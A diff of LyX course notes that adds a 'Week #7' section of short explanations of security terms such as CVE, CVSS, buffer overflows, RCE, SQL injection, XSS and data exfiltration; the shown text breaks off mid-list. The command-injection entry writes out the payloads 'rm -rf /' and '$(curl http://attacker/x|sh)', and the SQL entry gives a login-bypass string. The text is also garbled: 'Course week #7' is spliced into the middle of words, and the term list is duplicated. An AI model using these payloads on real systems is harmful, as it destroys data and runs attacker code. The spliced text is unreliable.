@@ -6884,7 +6884,7 @@ Classic Internet technologies such as TCP/IP,
  This is why protocols like CoAP over UDP or RPL-based routing are preferred,
  because they are lighter and allow more flexibility.
  Data formats like JSON and XML are also problematic in constrained networks.
- They are text-based,
+ They are text-baseCourse week #7d,
  verbose,
  and require significant parsing effort.
  A single sensor value can be encoded in many tens of bytes of text,
@@ -7051,6 +7051,7 @@ Is there Strict-Transport-Security set in the response?
 
 \begin_layout Standard
 \align center
+Course week #7
 \begin_inset Graphics
 	filename pasted52.png
 	scale 30
@@ -7243,7 +7244,7 @@ What is HTTP long polling?
 \end_layout
 
 \begin_layout Standard
-HTTP long polling is a technique used to simulate real-time communication over the traditional request–response model of HTTP.
+HTTP long polling is a technique used to simulate real-tiCourse week #7me communication over the traditional request–response model of HTTP.
  In normal HTTP,
  the client sends a request and the server immediately sends back a response,
  then the connection closes.
@@ -7283,6 +7284,7 @@ Use this tool to check few websites whether the server supports HTTP/2:
 
 \begin_layout Standard
 \align center
+Course week #7
 \begin_inset Graphics
 	filename pasted53.png
 	scale 30
@@ -7398,6 +7400,306 @@ Use hivemq.com open MQTT broker service with Python to publish MQTT messages.
 
 \end_layout
 
+\begin_layout Enumerate
+
+\color blue
+CVE
+\end_layout
+
+\begin_layout Enumerate
+
+\color blue
+CVSS
+\end_layout
+
+\begin_layout Enumerate
+
+\color blue
+Asymmetric encryption
+\end_layout
+
+\begin_layout Enumerate
+
+\color blue
+Symmetric encryption
+\end_layout
+
+\begin_layout Enumerate
+
+\color blue
+Disassembler
+\end_layout
+
+\begin_layout Enumerate
+
+\color blue
+Overflow vulnerability
+\end_layout
+
+\begin_layout Enumerate
+
+\color blue
+Race condition vulnerability
+\end_layout
+
+\begin_layout Enumerate
+
+\color blue
+ASLR/DEP/NX
+\end_layout
+
+\begin_layout Enumerate
+
+\color blue
+GhidraDescribe shortly following security tools/terms/concepts:
+\end_layout
+
+\begin_layout Enumerate
+
+\color blue
+CVE
+\end_layout
+
+\begin_layout Enumerate
+
+\color blue
+CVSS
+\end_layout
+
+\begin_layout Enumerate
+
+\color blue
+Asymmetric encryption
+\end_layout
+
+\begin_layout Enumerate
+
+\color blue
+Symmetric encryption
+\end_layout
+
+\begin_layout Enumerate
+
+\color blue
+Disassembler
+\end_layout
+
+\begin_layout Enumerate
+
+\color blue
+Overflow vulnerability
+\end_layout
+
+\begin_layout Enumerate
+
+\color blue
+Race condition vulnerability
+\end_layout
+
+\begin_layout Enumerate
+
+\color blue
+ASLR/DEP/NX
+\end_layout
+
+\begin_layout Enumerate
+
+\color blue
+Ghidra
+\end_layout
+
+\begin_layout Enumerate
+
+\color blue
+RCE vulnerability
+\end_layout
+
+\begin_layout Enumerate
+
+\color blue
+Local privilege escalation
+\end_layout
+
+\begin_layout Enumerate
+
+\color blue
+Zero-day vulnerability
+\end_layout
+
+\begin_layout Enumerate
+
+\color blue
+Zero-click exploit
+\end_layout
+
+\begin_layout Enumerate
+
+\color blue
+SQL injection
+\end_layout
+
+\begin_layout Enumerate
+
+\color blue
+Command injection vulnerability
+\end_layout
+
+\begin_layout Enumerate
+
+\color blue
+Cross-site scripting
+\end_layout
+
+\begin_layout Enumerate
+
+\color blue
+Information disclosure
+\end_layout
+
+\begin_layout Enumerate
+
+\color blue
+Code deobfuscation / obfuscation
+\end_layout
+
+\begin_layout Enumerate
+
+\color blue
+OSINT
+\end_layout
+
+\begin_layout Enumerate
+
+\color blue
+Data exfiltration
+\end_layout
+
+\begin_layout Enumerate
+
+\color blue
+Lateral movement
+\end_layout
+
+\begin_layout Enumerate
+
+\color blue
+Command & Control
+\end_layout
+
+\begin_layout Enumerate
+
+\color blue
+Social engineering
+\end_layout
+
+\begin_layout Enumerate
+
+\color blue
+IDS/NIDS
+\end_layout
+
+\begin_layout Enumerate
+
+\color blue
+SIEM
+\end_layout
+
+\begin_layout Enumerate
+
+\color blue
+RCE vulnerability
+\end_layout
+
+\begin_layout Enumerate
+
+\color blue
+Local privilege escalation
+\end_layout
+
+\begin_layout Enumerate
+
+\color blue
+Zero-day vulnerability
+\end_layout
+
+\begin_layout Enumerate
+
+\color blue
+Zero-click exploit
+\end_layout
+
+\begin_layout Enumerate
+
+\color blue
+SQL injection
+\end_layout
+
+\begin_layout Enumerate
+
+\color blue
+Command injection vulnerability
+\end_layout
+
+\begin_layout Enumerate
+
+\color blue
+Cross-site scripting
+\end_layout
+
+\begin_layout Enumerate
+
+\color blue
+Information disclosure
+\end_layout
+
+\begin_layout Enumerate
+
+\color blue
+Code deobfuscation / obfuscation
+\end_layout
+
+\begin_layout Enumerate
+
+\color blue
+OSINT
+\end_layout
+
+\begin_layout Enumerate
+
+\color blue
+Data exfiltration
+\end_layout
+
+\begin_layout Enumerate
+
+\color blue
+Lateral movement
+\end_layout
+
+\begin_layout Enumerate
+
+\color blue
+Command & Control
+\end_layout
+
+\begin_layout Enumerate
+
+\color blue
+Social engineering
+\end_layout
+
+\begin_layout Enumerate
+
+\color blue
+IDS/NIDS
+\end_layout
+
+\begin_layout Enumerate
+
+\color blue
+SIEM
+\end_layout
+
 \begin_layout Standard
 \begin_inset Graphics
 	filename pasted56.png
@@ -7437,7 +7739,1076 @@ The TCP source port was a dynamic client port (e.g.,
 The published data (messages like msg-0-9547,
  msg-1-6453,
  etc.) was clearly visible in plain text inside the MQTT publish packets,
- because the connection was not encrypted (no TLS was used).
+ because the connection was not encrypted (no TLS was used)
+\end_layout
+
+\begin_layout Part*
+Week #7
+\end_layout
+
+\begin_layout Standard
+
+\color blue
+Describe shortly following security tools/terms/concepts:
+\end_layout
+
+\begin_layout Enumerate
+
+\color blue
+CVE
+\end_layout
+
+\begin_layout Enumerate
+
+\color blue
+CVSS
+\end_layout
+
+\begin_layout Enumerate
+
+\color blue
+Asymmetric encryption
+\end_layout
+
+\begin_layout Enumerate
+
+\color blue
+Symmetric encryption
+\end_layout
+
+\begin_layout Enumerate
+
+\color blue
+Disassembler
+\end_layout
+
+\begin_layout Enumerate
+
+\color blue
+Overflow vulnerability
+\end_layout
+
+\begin_layout Enumerate
+
+\color blue
+Race condition vulnerability
+\end_layout
+
+\begin_layout Enumerate
+
+\color blue
+ASLR/DEP/NX
+\end_layout
+
+\begin_layout Enumerate
+
+\color blue
+Ghidra
+\end_layout
+
+\begin_layout Enumerate
+
+\color blue
+RCE vulnerability
+\end_layout
+
+\begin_layout Enumerate
+
+\color blue
+Local privilege escalation
+\end_layout
+
+\begin_layout Enumerate
+
+\color blue
+Zero-day vulnerability
+\end_layout
+
+\begin_layout Enumerate
+
+\color blue
+Zero-click exploit
+\end_layout
+
+\begin_layout Enumerate
+
+\color blue
+SQL injection
+\end_layout
+
+\begin_layout Enumerate
+
+\color blue
+Command injection vulnerability
+\end_layout
+
+\begin_layout Enumerate
+
+\color blue
+Cross-site scripting
+\end_layout
+
+\begin_layout Enumerate
+
+\color blue
+Information disclosure
+\end_layout
+
+\begin_layout Enumerate
+
+\color blue
+Code deobfuscation / obfuscation
+\end_layout
+
+\begin_layout Enumerate
+
+\color blue
+OSINT
+\end_layout
+
+\begin_layout Enumerate
+
+\color blue
+Data exfiltration
+\end_layout
+
+\begin_layout Enumerate
+
+\color blue
+Lateral movement
+\end_layout
+
+\begin_layout Enumerate
+
+\color blue
+Command & Control
+\end_layout
+
+\begin_layout Enumerate
+
+\color blue
+Social engineering
+\end_layout
+
+\begin_layout Enumerate
+
+\color blue
+IDS/NIDS
+\end_layout
+
+\begin_layout Enumerate
+
+\color blue
+SIEM
+\end_layout
+
+\begin_layout Standard
+\begin_inset Separator plain
+\end_inset
+
+
+\end_layout
+
+\begin_layout Enumerate
+
+\color brown
+CVE
+\color inherit
+ stands for Common Vulnerabilities and Exposures.
+ It is a publicly available database that lists known cybersecurity vulnerabilities and exposures in software and hardware systems.
+ Each entry in the CVE system has a unique identifier,
+ such as CVE-2023-12345,
+ and includes a short description of the vulnerability,
+ its potential impact,
+ and links to detailed reports or patches.
+ The purpose of CVE is to provide a standardized way for security researchers,
+ vendors,
+ a
+\color brown
+CVE
+\color inherit
+nd users to refer to the same issue across different tools and databases.
+ For example,
+ if a web server has a known bug that allows remote code execution,
+ it will receive a CVE ID so that everyone can track and patch it consistently.
+ CVE is maintained by MITRE Corporation and supported by organizations around the world as part of the effort to improve global cybersecurity awareness and coordination.
+\end_layout
+
+\begin_layout Enumerate
+CVSS stands for Common Vulnerability Scoring System.
+ It is a standardized framework used to assess the severity of security vulnerabilities.
+ CVSS assigns each vulnerability a numerical score from 0.0 to 10.0,
+ where higher values mean more critical risks.
+ The score is often translated into qualitative ratings such as Low,
+ Medium,
+ High,
+ or Critical.
+ CVSS considers three main groups of metrics:
+\end_layout
+
+\begin_deeper
+\begin_layout Itemize
+Base metrics,
+ which describe the fundamental characteristics of a vulnerability (for example,
+ how easy it is to exploit,
+ whether it requires user interaction,
+ and what kind of impact it has on confidentiality,
+ integrity,
+ or availability).
+\end_layout
+
+\begin_layout Itemize
+Temporal metrics,
+ which reflect factors that may change over time (such as availability of exploits or fixes).
+\end_layout
+
+\begin_layout Itemize
+Environmental metrics,
+ which take into account the specific context of the affected system (for instance,
+ how important that system is in a particular organization).
+\end_layout
+
+\begin_layout Standard
+For example,
+ a vulnerability that allows remote code execution without authentication will likely have a CVSS score close to 10.0,
+ meaning it is very dangerous.
+ The CVSS system helps organizations prioritize which vulnerabilities to patch first and communicate their severity in a consistent and comparable way.
+\end_layout
+
+\end_deeper
+\begin_layout Enumerate
+
+\color brown
+Asymmetric encryption,
+
+\color inherit
+ also known as public-key cryptography,
+ is a method of encrypting and decrypting data using two separate but mathematically related keys:
+ a public key and a private key.
+ The public key can be shared freely with anyone,
+ and it is used to encrypt messages.
+ The private key,
+ on the other hand,
+ is kept secret by the owner and is used to decrypt the messages that were encrypted with the corresponding public key.
+ Because of this design,
+ only the intended recipient (who owns the private key) can read the message.
+ This approach solves the key distribution problem that symmetric encryption faces (where both parties need to share the same secret key securely).
+ It also enables digital signatures,
+ where a sender uses their private key to sign data,
+ and anyone can verify the signature using the sender’s public key.
+ For example,
+ in HTTPS communication,
+ asymmetric encryption is used during the handshake phase to securely exchange symmetric session keys.
+ Common algorithms include RSA,
+ Elliptic Curve Cryptography (ECC),
+ and Diffie-Hellman key exchange.
+ The main advantage of asymmetric encryption is improved security and easier key management,
+ but it is computationally slower than symmetric encryption,
+ so it’s usually combined with symmetric methods in practice.
+\end_layout
+
+\begin_layout Enumerate
+
+\color brown
+Symmetric encryption
+\color inherit
+ is a method of encryption where the same secret key is used for both encrypting and decrypting data.
+ This means that both the sender and the receiver must know and securely share this key before communication begins.
+ It works by taking plain text and transforming it into unreadable cipher text using the shared key.
+ To read the message,
+ the receiver applies the same key to decrypt it back into the original form.
+ Symmetric encryption is generally much faster than asymmetric encryption and is used for encrypting large amounts of data,
+ such as files,
+ databases,
+ or network traffic.
+ However,
+ the main challenge is secure key distribution if someone intercepts or steals the key,
+ they can decrypt all the data.
+ Common symmetric encryption algorithms include AES (Advanced Encryption Standard),
+ DES (Data Encryption Standard),
+ and ChaCha20.
+ In practice,
+ symmetric encryption is often combined with asymmetric encryption:
+ asymmetric methods are used to exchange the secret key securely,
+ and then symmetric encryption is used for the actual data transfer.
+\end_layout
+
+\begin_layout Enumerate
+
+\color brown
+A disassembler
+\color inherit
+ is a tool that translates machine code (the low-level binary instructions executed by a CPU) back into assembly language,
+ which is a more human-readable representation of what the program does.
+ When software is compiled,
+ its original source code (for example,
+ C++ or Rust) is converted into binary instructions.
+ A disassembler reverses part of that process to show the underlying assembly instructions,
+ such as MOV,
+ JMP,
+ or CALL.
+ This is very useful for reverse engineering,
+ malware analysis,
+ and debugging,
+ especially when the original source code is not available.For example,
+ if a security researcher wants to understand how a piece of malware behaves,
+ they can load its binary into a disassembler like IDA Pro,
+ Ghidra,
+ or objdump.
+ The disassembler will display the program’s structure,
+ functions,
+ and instruction flow,
+ helping the analyst see what it does internally.
+ A disassembler does not recreate the original source code it only provides an approximate view at the assembly level.
+ Still,
+ it is an essential tool in cybersecurity,
+ software analysis,
+ and low-level debugging.
+\end_layout
+
+\begin_layout Enumerate
+
+\color brown
+An overflow vulnerability
+\color inherit
+ occurs when a program writes more data into a memory region or produces a numeric result larger than the space allocated for it.
+ This extra data or value “overflows” into adjacent memory or wraps around,
+ leading to unpredictable behavior,
+ crashes,
+ or even security breaches.
+ The most common types are buffer overflows and integer overflows.
+ A buffer overflow happens when a program writes more bytes into a buffer than it can hold,
+ for example by copying a 100-byte string into an 80-byte array.
+ This can corrupt nearby data or,
+ in unsafe languages like C and C++,
+ allow attackers to overwrite return addresses and execute arbitrary code.
+ An integer overflow happens when a numeric calculation exceeds the representable range of its type,
+ such as adding 1 to the maximum 32-bit unsigned integer.
+ This can cause logical errors,
+ incorrect allocations,
+ or bypass security checks.
+ Overflow vulnerabilities are dangerous because they can lead to program crashes,
+ data corruption,
+ denial of service,
+ or remote code execution.
+ They are common in low-level languages that do not automatically check array bounds or integer limits.
+ To prevent such vulnerabilities,
+ developers should validate all input,
+ check array bounds,
+ and use safe library functions for copying and formatting data.
+ Compiler and system-level protections like stack canaries,
+ ASLR,
+ and non-executable memory regions also help mitigate the risk.
+ Modern memory-safe languages such as Rust or Java automatically prevent most overflow-related issues.
+\end_layout
+
+\begin_layout Enumerate
+
+\color brown
+A race condition vulnerability 
+\color inherit
+occurs when the behavior of a program depends on the timing or sequence of events in concurrent execution,
+ and two or more operations that should happen in a specific order instead overlap or “race” each other.
+ If the timing changes for example,
+ because of system load or thread scheduling the program may read inconsistent data,
+ perform actions out of order,
+ or expose security flaws.
+ In security contexts,
+ race conditions often appear when two processes or threads access and modify a shared resource,
+ such as a file,
+ memory region,
+ or variable,
+ without proper synchronization.
+ For instance,
+ a program might check access permissions for a file and then open it;
+ if an attacker quickly replaces that file between the check and the open operation (a situation known as TOCTOU,
+ “Time of Check to Time of Use”),
+ they might gain unauthorized access or escalate privileges.
+ Race condition vulnerabilities are particularly dangerous in multi-threaded or multi-user systems,
+ because they can be intermittent and hard to reproduce.
+ They may cause data corruption,
+ crashes,
+ or security bypasses.
+ Preventing race conditions requires synchronization mechanisms such as mutexes,
+ semaphores,
+ atomic operations,
+ or transaction-like logic.
+ Developers should design code so that shared resources are accessed in a thread-safe way and critical sections are protected,
+ ensuring operations happen in a predictable and consistent order.
+\end_layout
+
+\begin_layout Enumerate
+
+\color brown
+ASLR,
+ DEP,
+ and NX
+\color inherit
+ are modern operating system security mechanisms designed to protect programs from memory-based attacks such as buffer overflows and code injection.
+ They do not fix programming bugs directly but make it much harder for attackers to exploit them successfully.
+
+\color brown
+ ASLR (Address Space Layout Randomization) 
+\color inherit
+randomizes the memory addresses used by key program areas such as the stack,
+ heap,
+ and libraries each time a program runs.
+ Because the attacker cannot predict where code or data will be located,
+ it becomes very difficult to execute reliable exploits that depend on fixed memory addresses.
+ 
+\color brown
+DEP (Data Execution Prevention)
+\color inherit
+ and NX (No eXecute) are related features that mark certain areas of memory (for example,
+ the stack or heap) as non-executable.
+ This means even if an attacker injects malicious code into memory,
+ the CPU will not execute it from those regions.
+ “NX” is the hardware-level feature name,
+ while “DEP” is the operating system implementation that uses it.
+ Together,
+ ASLR and DEP/NX significantly increase the difficulty of successful memory exploitation.
+ Attackers can still attempt to bypass these protections using advanced techniques such as return-oriented programming (ROP),
+ but combined with compiler hardening and safe coding practices,
+ these mechanisms form an essential layer of defense in modern systems.
+\end_layout
+
+\begin_layout Enumerate
+
+\color brown
+Ghidra 
+\color inherit
+is a free,
+ open-source software reverse-engineering framework developed by the U.S.
+ National Security Agency (NSA).
+ It provides a graphical user interface for disassembling and decompiling binaries into a more readable form,
+ letting analysts inspect program structure,
+ functions,
+ and control flow across many CPU architectures and file formats.
+ Ghidra includes an interactive disassembler,
+ a decompiler that produces C-like pseudocode,
+ debugging aids,
+ a symbol and type manager,
+ and a powerful scripting API (Java/Python) for automation and custom analysis.
+ Security researchers,
+ malware analysts,
+ and reverse-engineers use Ghidra to explore unknown binaries when source code is not available,
+ to find vulnerabilities,
+ understand malware behavior,
+ or recover algorithms.
+ Compared to commercial tools like IDA Pro,
+ Ghidra is notable for being free,
+ extensible,
+ and having an integrated decompiler;
+ it may require some manual cleanup of decompiled output,
+ but its extensibility and active community plugins make it a professional-grade reverse-engineering platform.
+\end_layout
+
+\begin_layout Enumerate
+
+\color brown
+An RCE (Remote Code Execution)
+\color inherit
+ vulnerability lets an attacker run arbitrary code on a target system over the network.
+ In practice this means the attacker can make the remote server or device execute commands or programs of their choosing,
+ often by sending specially crafted input that the application incorrectly handles.
+ Common root causes include unchecked user input (command injection),
+ unsafe deserialization,
+ memory-corruption bugs (like buffer overflows),
+ and flaws in interpreters or plugins that evaluate data as code.
+ RCE is one of the most severe classes of vulnerability because it gives the attacker full control of the compromised host:
+ they can read or modify data,
+ install backdoors,
+ pivot to other systems,
+ or destroy services.
+ The impact ranges from data theft and service takeover to complete infrastructure compromise.
+ Preventive measures include keeping software and libraries patched,
+ validating and sanitizing all external input,
+ avoiding unsafe functions (e.g.,
+ direct shell calls with user data),
+ using safe serialization formats and libraries,
+ applying least-privilege for services,
+ and running untrusted code in sandboxes or containers.
+ Network-level protections like firewalls and WAFs,
+ and host-level hardening (ASLR/DEP,
+ regular integrity monitoring) reduce exploitation likelihood and impact.
+ To find RCEs,
+ use static code review focused on dangerous APIs,
+ dynamic testing and fuzzing,
+ dependency vulnerability scanning,
+ and penetration testing that attempts common exploitation techniques (injection,
+ deserialization payloads,
+ exploit toolchains).
+ Logs,
+ intrusion detection systems,
+ and honeypots can help detect active exploitation attempts.
+\end_layout
+
+\begin_layout Enumerate
+
+\color brown
+A local privilege escalation (LPE) vulnerability
+\color inherit
+ allows an attacker who already has some level of access to a system for example,
+ a low-privileged user account or access through a compromised service to gain higher privileges,
+ such as root or Administrator.
+ Unlike remote code execution,
+ LPE requires local access first;
+ the attacker exploits flaws in the operating system,
+ drivers,
+ setuid programs,
+ misconfigured services,
+ or poorly written privileged software to escalate their rights.
+ Common causes include insecure file permissions,
+ race conditions (TOCTOU),
+ kernel bugs,
+ flawed privilege checks,
+ and insecure use of system utilities that run with elevated privileges.
+ The impact of an LPE can be severe:
+ once an attacker becomes root/Administrator they can read or modify any file,
+ install persistent backdoors,
+ disable defenses,
+ and pivot to other targets.
+ Preventing LPEs involves minimizing the attack surface (run only necessary services,
+ avoid running daemons as root),
+ fixing misconfigurations (correct file permissions,
+ remove unnecessary setuid binaries),
+ keeping kernels and drivers patched,
+ using least-privilege design patterns,
+ and employing system hardening like SELinux/AppArmor,
+ secure boot,
+ and integrity monitoring.
+ Detection techniques include monitoring for unexpected privilege changes,
+ auditing authentication and sudo/su logs,
+ using host-based intrusion detection,
+ and regularly fuzzing and auditing privileged code paths.
+\end_layout
+
+\begin_layout Enumerate
+
+\color brown
+A zero-day vulnerability
+\color inherit
+ is a previously unknown software flaw that has not yet been discovered or patched by the vendor.
+ The term “zero-day” means that developers have had zero days to fix the issue before it can be exploited.
+ Because no official patch or mitigation exists at the time of discovery,
+ zero-day vulnerabilities are extremely dangerous attackers can use them to compromise systems silently before defenders even know the flaw exists.
+ Zero-day vulnerabilities are often found and exploited by advanced attackers,
+ such as cybercriminal groups or state-sponsored actors,
+ to gain unauthorized access,
+ steal data,
+ or install malware.
+ Exploits for zero-days are highly valuable and sometimes sold on black markets or used in targeted attacks against specific organizations or infrastructure.
+ Once a zero-day is discovered publicly or used in an attack,
+ the software vendor usually investigates the issue and releases a security patch.
+ The period between initial exploitation and patch release is called the zero-day window,
+ and systems remain vulnerable until updates are applied.
+ Preventing zero-day attacks relies on general security hygiene:
+ keeping software up to date,
+ using behavior-based detection tools (such as endpoint protection and intrusion detection systems),
+ limiting privileges,
+ segmenting networks,
+ and monitoring for abnormal activity.
+ Although zero-days cannot be patched in advance,
+ strong layered defenses can minimize their impact.
+\end_layout
+
+\begin_layout Enumerate
+
+\color brown
+A zero-click exploit
+\color inherit
+ is an attack that compromises a device or application without any interaction from the victim the attacker does not need the user to click a link,
+ open a file,
+ or accept a prompt.
+ Instead the exploit is delivered and triggered by processing some seemingly benign input the victim receives automatically,
+ for example a specially crafted image,
+ video,
+ push notification,
+ MMS/SMS message,
+ or network packet that an app or service parses immediately.
+ Because the victim doesn’t have to do anything,
+ zero-clicks are stealthy,
+ hard to notice,
+ and ideal for targeted surveillance or high-value intrusions.
+ Why it’s especially dangerous:
+ zero-clicks bypass social-engineering defenses (users can’t be trained to avoid them),
+ they often exploit complex parsers or protocol handling code (media libraries,
+ message renderers,
+ Bluetooth/Wi-Fi stacks),
+ and they can yield remote code execution or full device takeover.
+ High-profile spyware tools used in targeted attacks often rely on zero-click techniques.
+ Common mitigations include keeping software and firmware up to date,
+ minimizing attack surface by disabling unused services and protocols,
+ using app sandboxing and privilege separation,
+ employing memory-safety practices in parser code,
+ and applying network/content filtering where possible.
+ Detection is difficult but can be improved with endpoint telemetry,
+ anomaly detection on process behavior,
+ and rapid patching when vendors publish fixes.
+\end_layout
+
+\begin_layout Enumerate
+
+\color brown
+SQL injection
+\color inherit
+ is a vulnerability that occurs when an application includes untrusted user input directly into a database query,
+ allowing an attacker to modify the intended SQL command.
+ Instead of just supplying data,
+ the attacker crafts input that changes the query logic (for example,
+ submitting ' OR '1'='1' to a login field) so the database returns unauthorized data,
+ bypasses authentication,
+ or executes destructive commands.
+ In worst cases an attacker can read or alter sensitive data,
+ delete tables,
+ escalate privileges via DB features,
+ or even run commands on the host when the database supports that.
+ SQL injection usually stems from building SQL strings by concatenation or interpolation without proper handling of input.
+ The primary defenses are using parameterized queries / prepared statements (never concatenate user data into SQL),
+ strict input validation and whitelisting,
+ using least-privilege database accounts,
+ and applying output encoding where appropriate.
+ Additional protections include ORMs (when used correctly),
+ stored procedures with parameters,
+ a Web Application Firewall to block common payloads,
+ and regular security testing (code reviews,
+ automated scanners,
+ and dynamic testing tools like sqlmap or fuzzers) to detect vulnerable endpoints.
+\end_layout
+
+\begin_layout Enumerate
+
+\color brown
+A command injection vulnerability
+\color inherit
+ occurs when an application constructs operating-system commands by concatenating or interpolating untrusted input and then executes that command on the host.
+ An attacker supplies specially crafted input that changes the command’s meaning or appends new commands,
+ causing the server to run arbitrary shell commands.
+ For example,
+ if a web app runs ping on a host provided by the user and does something like system("ping " + host),
+ an attacker could supply example.com;
+ rm -rf / or $(curl http://attacker/x|sh) and force the server to execute unintended operations.
+ Command injection is dangerous because it typically leads to full system compromise:
+ data exfiltration,
+ file modification or deletion,
+ privilege escalation,
+ installation of backdoors,
+ or lateral movement.
+ It often appears in code that calls shell utilities,
+ uses system()/popen()/exec family functions,
+ or constructs command lines for subprocesses without properly handling input.
+ To prevent command injection,
+ avoid invoking the shell with user input.
+ Use safe APIs that accept arguments as arrays (so no shell parsing occurs),
+ e.g.,
+ execv/execve or language-specific libraries that take argument lists.
+ Validate and whitelist allowed inputs (reject anything not matching strict patterns),
+ avoid concatenating strings into commands,
+ drop unnecessary privileges for the process,
+ and run risky operations in isolated environments (containers,
+ sandboxes) when possible.
+ Additional mitigations include escaping inputs correctly when a shell must be used,
+ using least-privilege execution contexts,
+ enabling strict SELinux/AppArmor policies,
+ and performing code review and dynamic testing (fuzzing/pen tests) focused on command-invoking code paths.
+\end_layout
+
+\begin_layout Enumerate
+
+\color brown
+Cross-Site Scripting,
+ or XSS
+\color inherit
+,
+ is a web security vulnerability that allows an attacker to inject and execute malicious scripts,
+ typically JavaScript,
+ in the browser of another user.
+ It happens when a website takes user input and displays it on a page without properly sanitizing or escaping it.
+ As a result,
+ the attacker’s code runs in the victim’s browser with the same permissions as the legitimate site,
+ which can lead to stolen cookies,
+ hijacked sessions,
+ fake login forms,
+ or unauthorized actions performed on behalf of the user.
+ There are three main variants of XSS.
+ In stored XSS,
+ the malicious script is permanently saved on the server,
+ for example in a comment or user profile,
+ and delivered to every visitor who views that content.
+ In reflected XSS,
+ the malicious code is part of a crafted URL or request and is immediately reflected back to the browser in the server’s response.
+ In DOM-based XSS,
+ the attack happens entirely on the client side when the page’s JavaScript modifies the document object model using untrusted data.
+ XSS can be prevented by validating all user input and encoding or escaping any dynamic content before including it in the page.
+ Developers should use secure templating engines and frameworks that automatically escape user data,
+ apply Content Security Policy headers to restrict where scripts can run,
+ and sanitize any user-provided HTML.
+ Proper handling of input and output is the key to avoiding this class of vulnerabilities.
+\end_layout
+
+\begin_layout Enumerate
+
+\color brown
+Information disclosure
+\color inherit
+ is a vulnerability that occurs when a system unintentionally exposes sensitive data to unauthorized users.
+ This can include technical details such as server versions,
+ API keys,
+ database errors,
+ or source code,
+ as well as personal or confidential information like usernames,
+ passwords,
+ financial data,
+ or internal documents.
+ The exposure can happen through many channels verbose error messages,
+ misconfigured servers,
+ public backups,
+ debug logs,
+ insecure APIs,
+ or predictable URLs.
+ Even small leaks can be dangerous,
+ as they give attackers clues about the system’s structure,
+ technologies,
+ and weaknesses,
+ which can be used to craft more effective attacks such as SQL injection or privilege escalation.
+ In severe cases,
+ direct data exposure can violate privacy laws and cause major reputational and financial damage.
+ Preventing information disclosure involves minimizing what the system reveals to outsiders.
+ Error messages should be generic,
+ while detailed logs and stack traces should only be accessible to administrators.
+ Sensitive files and directories must be properly secured and excluded from public access.
+ Configuration files,
+ credentials,
+ and debug endpoints should never be exposed,
+ and data in transit must always be encrypted.
+ Regular security audits,
+ penetration tests,
+ and monitoring of public assets help detect accidental data leaks early.
+\end_layout
+
+\begin_layout Enumerate
+
+\color brown
+Code obfuscation
+\color inherit
+ is the deliberate transformation of program code to make it hard for humans (and simple tools) to understand while preserving its behavior.
+ Developers use obfuscation to protect intellectual property,
+ hide licensing checks,
+ or make reverse-engineering and tampering harder.
+ Common obfuscation techniques include renaming identifiers to meaningless names,
+ removing or mangling metadata,
+ encrypting or hiding strings,
+ inserting bogus or opaque control flow so the program’s logic is hard to follow,
+ compiling to custom bytecode or a VM,
+ and packing/bundling with a runtime unpacker.
+ On the malicious side,
+ malware authors use stronger obfuscation and packing to evade detection and analysis.
+ Code deobfuscation is the effort to reverse those transformations and recover a readable/analysable version of the program.
+ Deobfuscation ranges from trivial (replacing meaningless identifiers with readable ones,
+ pretty-printing) to very hard (undoing control-flow flattening,
+ decrypting runtime string tables,
+ or reversing a custom VM).
+ Analysts use static tools (disassemblers/decompilers like Ghidra,
+ IDA,
+ JADX for Android,
+ or radare2) and dynamic techniques (debugging,
+ instrumentation,
+ hooking runtime functions,
+ collecting unpacked memory at runtime) to recover original logic.
+ Heuristics and pattern matching,
+ automated deobfuscators (de4dot for .NET,
+ jadx-gui improvements,
+ or plugins for Ghidra),
+ and symbolic or concolic execution help when simple reversing fails.
+ Typical obfuscation techniques and how analysts approach them:
+ identifier renaming is undone by renaming based on types,
+ usage patterns,
+ and inferred semantics;
+ string encryption is attacked by running the program under a debugger or instrumenter and dumping memory after the decrypter runs;
+ control-flow flattening is recovered by reconstructing basic blocks and reordering them into a sensible flow using control-flow graph analysis;
+ packers are handled by letting the program unpack in a sandbox,
+ then dumping the process memory to extract the real code;
+ custom VMs require building an interpreter for the VM bytecode or translating bytecode back into higher-level constructs.
+ For defenders who want resilience,
+ practical measures include combining lightweight obfuscation (identifier mangling,
+ string hiding) with runtime checks,
+ integrity verification,
+ and code signing.
+ For attackers or red-teamers,
+ heavy obfuscation plus anti-debug/anti-instrumentation and VM-based packing raises the bar but also increases complexity and risk of breaking legitimate functionality.
+ For analysts,
+ a good workflow is automated static scanning first,
+ then targeted dynamic analysis (sandboxing,
+ hooking),
+ followed by manual graph-based reconstruction and cleanup in a decompiler.
+ Tools you’ll see often:
+ ProGuard/R8 and DexGuard for Java/Android obfuscation,
+ Dotfuscator and ConfuserEx for .NET,
+ commercial packers/obfuscators for native code,
+ and for analysis:
+ Ghidra,
+ IDA,
+ radare2,
+ JADX,
+ de4dot,
+ and memory dumpers / instrumentation frameworks like Frida.
+ Deobfuscation is a cat-and-mouse game:
+ no single trick stops determined reverse engineers,
+ but layered protections make casual analysis much harder.
+\end_layout
+
+\begin_layout Enumerate
+
+\color brown
+OSINT,
+ or Open-Source Intelligence
+\color inherit
+,
+ is the practice of gathering,
+ analyzing,
+ and interpreting information from publicly available sources.
+ These sources include websites,
+ social media platforms,
+ online forums,
+ company reports,
+ government publications,
+ leaked databases,
+ and even satellite imagery.
+ The key idea behind OSINT is that valuable intelligence can be obtained without breaking any laws or hacking systems all the data is openly accessible.
+ In cybersecurity,
+ OSINT is widely used to identify potential threats,
+ monitor data breaches,
+ trace malicious actors,
+ and assess the exposure of sensitive information.
+ For example,
+ analysts might use OSINT to find leaked passwords on dark web forums,
+ discover domains registered by threat actors,
+ or collect metadata from social media to link different online identities.
+ Security teams also use OSINT to evaluate their own organization’s digital footprint and detect what internal information may have been unintentionally made public.
+ Although OSINT uses only public information,
+ it must be applied carefully.
+ The quality of sources and the context of data are critical,
+ since misinformation or outdated data can lead to wrong conclusions.
+ Effective OSINT combines technical tools —
+ such as search operators,
+ metadata extractors,
+ and automated scanners with human analytical skills to transform raw data into reliable intelligence.
+\end_layout
+
+\begin_layout Enumerate
+
+\color brown
+Data exfiltration
+\color inherit
+ is the unauthorized transfer of sensitive information from a system to an attacker-controlled location.
+ It can be deliberate (an insider stealing files) or covert (malware quietly collecting and sending data),
+ and targets anything of value:
+ credentials,
+ intellectual property,
+ personal data,
+ databases,
+ or backups.
+ Techniques range from obvious uploads to cloud storage or email,
+ to stealthier channels like DNS tunneling,
+ encrypted HTTPS,
+ covert timing channels,
+ or piggybacking on legitimate cloud-sync services.
+ Detecting exfiltration is hard because attackers try to blend with normal traffic:
+ look for unusual large transfers,
+ odd destinations,
+ new or rare protocols,
